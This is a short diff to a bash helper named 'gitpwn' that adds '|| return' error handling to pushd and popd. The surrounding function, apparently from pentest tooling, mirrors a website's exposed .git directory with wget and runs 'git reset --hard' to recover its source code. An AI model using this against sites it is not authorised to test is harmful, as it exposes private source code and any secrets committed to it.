@@ -5,9 +5,9 @@ gitpwn() {
     echo "Found open .git dir.. performing gitpwnage"
     wget -q --mirror --include-directories=/.git "${1}"
     domain=$(awk -F/ '{print $3}' <<< "$1")
-    pushd "${domain}"
+    pushd "${domain}" || return
     git reset --hard
-    popd
+    popd || return
   else
     echo -e "Could not pwn that site"
   fi
